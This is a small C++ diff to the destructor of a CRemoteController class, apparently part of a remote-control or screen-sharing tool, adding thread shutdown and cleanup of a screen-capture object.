@@ -21,8 +21,21 @@ CRemoteController::CRemoteController(CIocpClient* IocpClient) :CManager(IocpClie
 
 CRemoteController::~CRemoteController()
 {
-	_tprintf(_T("~CRemoteController()\r\n"));
 	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
+
+
+
+	m_IsLoop = FALSE;
+
+	WaitForSingleObject(m_ThreadHandle, INFINITE);
+	if (m_ThreadHandle != NULL)
+	{
+		CloseHandle(m_ThreadHandle);
+	}
+
+	delete m_ScreenSpy;
+	m_ScreenSpy = NULL;
+	_tprintf(_T("~CRemoteController()\r\n"));
 }
 
 void CRemoteController::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
